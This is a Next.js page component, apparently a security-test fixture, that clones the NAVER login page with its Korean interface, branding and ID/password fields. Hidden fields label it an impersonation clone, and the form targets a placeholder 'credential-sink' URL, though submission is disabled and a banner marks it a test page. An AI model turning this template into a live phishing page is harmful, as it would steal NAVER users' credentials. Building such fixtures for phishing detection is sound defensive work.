"use client";

import Image from "next/image";

const footerLinks = ["이용약관", "개인정보처리방침", "책임의 한계와 법적고지", "회원정보 고객센터"];

export default function Home() {
  return (
    <>
      <div id="wrap" className="wrap">
        <div className="u_skip">
          <a href="#container">본문 바로가기</a>
        </div>

        <header className="header" role="banner">
          <div className="header_inner">
            <a href="#fixture-disabled" className="logo" id="log.naver" aria-label="NAVER">
              <h1 className="blind">NAVER</h1>
            </a>
            <div className="lang" id="show_locale_switch">
              <select id="locale_switch" name="locale_switch" title="언어선택" className="sel">
                <option value="ko_KR">한국어</option>
                <option value="en_US">English</option>
                <option value="zh-Hans_CN">中文(简体)</option>
                <option value="zh-Hant_TW">中文(台灣)</option>
              </select>
            </div>
          </div>
        </header>

        <div id="container" className="container">
          <div className="content">
            <div className="login_wrap">
              <ul className="menu_wrap" role="tablist" id="tabArea">
                <li className="menu_item" role="presentation">
                  <div className="menu_id on">
                    <a href="#none" id="loinid" className="tab_inner" role="tab" aria-selected="true">
                      <span className="menu_text">
                        <span className="text">ID/전화번호</span>
                      </span>
                    </a>
                  </div>
                </li>
                <li className="menu_item" role="presentation">
                  <div className="menu_ones">
                    <a href="#none" id="log.otnlogtab" className="tab_inner" role="tab" aria-selected="false">
                      <span className="menu_text">
                        <span className="text">일회용 번호</span>
                      </span>
                    </a>
                  </div>
                </li>
                <li className="menu_item" role="presentation">
                  <div className="menu_qr">
                    <a href="#none" id="log.qrlogtab" className="tab_inner" role="tab" aria-selected="false">
                      <span className="menu_text">
                        <span className="text">QR코드</span>
                      </span>
                    </a>
                  </div>
                </li>
              </ul>

              <form
                id="frmNIDLogin"
                name="frmNIDLogin"
                target="_top"
                autoComplete="off"
                action="https://example.invalid/linclean-fixture/credential-sink"
                method="POST"
                onSubmit={(event) => {
                  event.preventDefault();
                }}
              >
                <input type="hidden" id="localechange" name="localechange" value="" />
                <input type="hidden" name="dynamicKey" id="dynamicKey" value="linclean-fixture-disabled" />
                <input type="hidden" name="eccpw" id="eccpw" value="" />
                <input type="hidden" name="sessionKey" id="sessionKey" value="" />
                <input type="hidden" name="enctp" id="enctp" value="19" />
                <input type="hidden" name="next_step" id="next_step" value="false" />
                <input type="hidden" name="show_pk" id="show_pk" value="true" />
                <input type="hidden" name="fixture" id="fixture" value="linclean-static-clone" />
                <input type="hidden" name="source" id="source" value="naver-impersonation-login" />
                <input type="hidden" name="locale" id="locale" value="ko_KR" />
                <input type="hidden" name="url" id="url" value="https://www.naver.com/" />

                <ul className="panel_wrap">
                  <li className="panel_item">
                    <div className="panel_inner" role="tabpanel" aria-controls="loinid">
                      <div className="login_form">
                        <div className="login_box">
                          <div className="input_item id off" id="input_item_id">
                            <input
                              type="text"
                              id="id"
                              name="id"
                              accessKey="L"
                              maxLength={41}
                              autoCapitalize="none"
                              title="아이디"
                              className="input_id"
                              aria-label="아이디 또는 전화번호"
                            />
                            <label htmlFor="id" className="text_label" id="id_label" aria-hidden="true">
                              아이디 또는 전화번호
                            </label>
                            <button type="button" className="btn_delete" id="id_clear">
                              <span className="icon_delete">
                                <span className="blind">삭제</span>
                              </span>
                            </button>
                          </div>
                          <div className="input_item pw off" id="input_item_pw">
                            <input
                              type="password"
                              id="pw"
                              name="pw"
                              title="비밀번호"
                              className="input_pw"
                              maxLength={16}
                              aria-label="비밀번호"
                            />
                            <label htmlFor="pw" className="text_label" id="pw_label" aria-hidden="true">
                              비밀번호
                            </label>
                            <button type="button" className="btn_view hide" id="pw_hide">
                              <span className="icon_view">
                                <span className="blind" id="icon_view">
                                  비밀번호 표시
                                </span>
                              </span>
                            </button>
                            <button type="button" className="btn_delete" id="pw_clear">
                              <span className="icon_delete">
                                <span className="blind">삭제</span>
                              </span>
                            </button>
                          </div>
                        </div>
                      </div>

                      <div className="login_keep_wrap" id="login_keep_wrap">
                        <div className="keep_check" id="keep" role="checkbox" aria-checked="false" tabIndex={0}>
                          <input
                            type="checkbox"
                            id="nvlong"
                            name="nvlong"
                            tabIndex={-1}
                            aria-hidden="true"
                            className="input_keep"
                            value="off"
                          />
                          <span className="keep_text">로그인 상태 유지</span>
                        </div>
                        <div className="ip_check">
                          <a href="#fixture-disabled" id="ipguide" title="IP보안">
                            <span className="ip_text">IP보안</span>
                          </a>
                          <span className="switch">
                            <input type="checkbox" id="switch" className="switch_checkbox" value="off" />
                            <label htmlFor="switch" className="switch_btn">
                              <span className="switch_on" aria-hidden="true">
                                ON
                              </span>
                              <span className="switch_off" aria-hidden="true">
                                OFF
                              </span>
                            </label>
                          </span>
                        </div>
                      </div>

                      <div className="btn_login_wrap">
                        <button type="button" className="btn_login off next_step" id="log.login">
                          <span className="btn_text" id="log.login.text">
                            다음
                          </span>
                        </button>
                      </div>

                      <div className="dividing_safe" id="passkey.divider">
                        <span className="text">지문 · 얼굴 인증을 설정했다면</span>
                      </div>
                      <div className="btn_login_wrap" id="passkey.warpper">
                        <button type="button" className="btn_login white nlog-click" id="log.passkeylogin">
                          <span className="btn_text">패스키 로그인</span>
                        </button>
                      </div>
                    </div>
                  </li>
                </ul>
              </form>
            </div>

            <ul className="find_wrap" id="find_wrap">
              <li>
                <a href="#fixture-disabled" id="pwinquiry" className="find_text">
                  비밀번호 찾기
                </a>
              </li>
              <li>
                <a href="#fixture-disabled" id="idinquiry" className="find_text">
                  아이디 찾기
                </a>
              </li>
              <li>
                <a href="#fixture-disabled" id="join" className="find_text">
                  회원가입
                </a>
              </li>
            </ul>

            <div id="log.banner" className="banner_wrap">
              &nbsp;
            </div>
          </div>
        </div>

        <div className="footer">
          <div className="footer_inner">
            <ul className="footer_link" id="footer_link">
              {footerLinks.map((label) => (
                <li key={label}>
                  <a className="footer_item" href="#fixture-disabled">
                    <span className="text">{label === "개인정보처리방침" ? <strong>{label}</strong> : label}</span>
                  </a>
                </li>
              ))}
            </ul>
            <div className="footer_copy">
              <a id="fot.naver" href="#fixture-disabled">
                <span className="footer_logo">
                  <span className="blind">네이버</span>
                </span>
              </a>
              <span className="text">Copyright</span>
              <span className="corp">© NAVER Corp.</span>
              <span className="text">All Rights Reserved.</span>
            </div>
          </div>
        </div>
      </div>
      <p className="fixture_alt_probe">
        THIS IS A SECURITY TEST PAGE. DO NOT USE REAL CREDENTIALS.
        <Image src="/images/naver-logo.svg" alt="NAVER 로고" width={184} height={36} />
      </p>
    </>
  );
}
